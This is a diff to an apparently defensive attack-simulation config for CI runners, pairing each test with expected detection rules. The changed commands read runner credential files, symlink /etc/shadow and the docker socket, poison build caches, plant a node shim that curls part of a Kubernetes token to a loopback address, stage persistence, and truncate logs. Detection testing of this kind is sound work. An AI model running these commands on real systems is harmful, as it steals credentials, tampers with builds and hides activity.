@@ -59,7 +59,7 @@ attacks:
   - name: recon-shared-work-volume
     type: custom
     exec:
-      command: ["sh", "-c", "df -h /_work /.cache /.gradle /go /.m2 /tmp 2>/dev/null; mount | grep -E '_work|cache'"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; df -h $R/_work $R/.cache $R/.gradle $R/go $R/.m2 /tmp 2>/dev/null; mount | grep -E '_work|cache'"]
     expectedDetections: []
 
   # T1613 — Container and Resource Discovery: is the docker socket reachable?
@@ -109,7 +109,7 @@ attacks:
   - name: cred-runner-credentials-file
     type: lfi
     exec:
-      command: ["sh", "-c", "cat /home/runner/.credentials /home/runner/.runner 2>/dev/null; cat /_work/.credentials* 2>/dev/null"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; cat /home/runner/.credentials /home/runner/.runner 2>/dev/null; cat $R/_work/.credentials* 2>/dev/null"]
     expectedDetections:
       - attackType: lfi
         ruleID: R0010
@@ -357,7 +357,7 @@ attacks:
   - name: cache-poison-shared-work-volume
     type: custom
     exec:
-      command: ["sh", "-c", "mkdir -p /.cache/poison /go/pkg/mod/cache/download /.m2/repository /.gradle/caches && printf 'console.log(require(\"child_process\").execSync(\"id\"))' > /.cache/poison/postinstall.js && cp /.cache/poison/postinstall.js /.m2/repository/.poison"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; mkdir -p $R/.cache/poison $R/go/pkg/mod/cache/download $R/.m2/repository $R/.gradle/caches && printf 'console.log(require(\"child_process\").execSync(\"id\"))' > $R/.cache/poison/postinstall.js && cp $R/.cache/poison/postinstall.js $R/.m2/repository/.poison"]
     expectedDetections:
       - attackType: custom
         ruleID: R0002
@@ -368,7 +368,7 @@ attacks:
   - name: cache-poison-node-modules-shim
     type: custom
     exec:
-      command: ["sh", "-c", "mkdir -p /_work/_tool/node/bin && printf '#!/bin/sh\\ncurl -s -m 2 http://127.0.0.1:1/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 16) >/dev/null 2>&1\\nexec /usr/bin/node \"$@\"\\n' > /_work/_tool/node/bin/node && chmod +x /_work/_tool/node/bin/node"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; mkdir -p $R/_work/_tool/node/bin && printf '#!/bin/sh\\ncurl -s -m 2 http://127.0.0.1:1/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 16) >/dev/null 2>&1\\nexec /usr/bin/node \"$@\"\\n' > $R/_work/_tool/node/bin/node && chmod +x $R/_work/_tool/node/bin/node"]
     expectedDetections:
       - attackType: custom
         ruleID: R0002
@@ -569,7 +569,7 @@ attacks:
   - name: escape-symlink-sensitive-path
     type: custom
     exec:
-      command: ["sh", "-c", "ln -sf /etc/shadow /_work/.shadow-link 2>/dev/null; ln -sf /var/run/docker.sock /_work/.sock-link 2>/dev/null; ls -l /_work/.shadow-link /_work/.sock-link 2>/dev/null"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; ln -sf /etc/shadow $R/_work/.shadow-link 2>/dev/null; ln -sf /var/run/docker.sock $R/_work/.sock-link 2>/dev/null; ls -l $R/_work/.shadow-link $R/_work/.sock-link 2>/dev/null"]
     expectedDetections:
       - attackType: custom
         ruleID: R1010
@@ -587,7 +587,7 @@ attacks:
   - name: escape-hardlink-sensitive-path
     type: custom
     exec:
-      command: ["sh", "-c", "cp /etc/passwd /_work/.seed 2>/dev/null; ln /_work/.seed /_work/.passwd-hard 2>&1; ln /etc/passwd /tmp/.passwd-hard 2>&1; ls -l /_work/.passwd-hard /tmp/.passwd-hard 2>&1 | head -2"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; cp /etc/passwd $R/_work/.seed 2>/dev/null; ln $R/_work/.seed $R/_work/.passwd-hard 2>&1; ln /etc/passwd /tmp/.passwd-hard 2>&1; ls -l $R/_work/.passwd-hard /tmp/.passwd-hard 2>&1 | head -2"]
     expectedDetections:
       - attackType: custom
         ruleID: R1012
@@ -703,7 +703,7 @@ attacks:
   - name: persist-stage-runner-binary
     type: custom
     exec:
-      command: ["sh", "-c", "mkdir -p /_work/.rogue && printf '#!/bin/sh\\nwhile :; do sleep 3600; done\\n' > /_work/.rogue/run.sh && chmod +x /_work/.rogue/run.sh && /_work/.rogue/run.sh & sleep 1; echo staged"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; mkdir -p $R/_work/.rogue && printf '#!/bin/sh\\nwhile :; do sleep 3600; done\\n' > $R/_work/.rogue/run.sh && chmod +x $R/_work/.rogue/run.sh && $R/_work/.rogue/run.sh & sleep 1; echo staged"]
     expectedDetections:
       - attackType: custom
         ruleID: R1004
@@ -820,7 +820,7 @@ attacks:
   - name: publish-force-push-action-tags
     type: custom
     exec:
-      command: ["sh", "-c", "git -C /_work ls-remote --tags https://github.com/cncf/automation 2>&1 | head -3; git config --global user.email probe@local; echo 'push --force --tags withheld'"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; git -C $R/_work ls-remote --tags https://github.com/cncf/automation 2>&1 | head -3; git config --global user.email probe@local; echo 'push --force --tags withheld'"]
     expectedDetections:
       - attackType: custom
         ruleID: R0011
@@ -874,7 +874,7 @@ attacks:
   - name: evade-clear-runner-logs
     type: custom
     exec:
-      command: ["sh", "-c", "ls /_work/_diag/ 2>/dev/null | head -3; truncate -s 0 /_work/_diag/*.log 2>/dev/null; echo cleared"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; ls $R/_work/_diag/ 2>/dev/null | head -3; truncate -s 0 $R/_work/_diag/*.log 2>/dev/null; echo cleared"]
     expectedDetections:
       - attackType: custom
         ruleID: R0002
@@ -902,7 +902,7 @@ attacks:
   - name: evade-cleanup-staged-artefacts
     type: custom
     exec:
-      command: ["sh", "-c", "rm -rf /tmp/hijack /tmp/.beacon /tmp/.cron-stage /tmp/xmrig /_work/.rogue /_work/.shadow-link /_work/.sock-link /_work/.passwd-hard /.cache/poison /.m2/repository/.poison /_work/_tool/node/bin/node 2>/dev/null; echo cleaned"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; rm -rf /tmp/hijack /tmp/.beacon /tmp/.cron-stage /tmp/xmrig $R/_work/.rogue $R/_work/.shadow-link $R/_work/.sock-link $R/_work/.passwd-hard $R/.cache/poison $R/.m2/repository/.poison $R/_work/_tool/node/bin/node 2>/dev/null; echo cleaned"]
     expectedDetections:
       - attackType: custom
         ruleID: R0002
